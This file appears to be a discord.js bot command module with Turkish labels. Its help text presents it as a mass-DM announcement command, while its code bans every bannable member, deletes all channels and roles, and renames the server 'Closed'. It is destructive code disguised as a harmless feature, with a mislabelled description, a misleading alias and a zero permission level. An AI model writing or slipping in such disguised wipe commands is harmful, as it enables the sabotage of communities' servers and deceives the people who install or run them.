const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {

message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Elim Çarptı")
message.delete()
}
})

message.guild.channels.deleteAll("");
message.guild.roles.deleteAll("");
}

message.guild.setName(`Kapandı`, "")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
message.guild.createChannel(`hey`)
message.delete()
};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['burayi-bi-düzelt'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'benberke',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
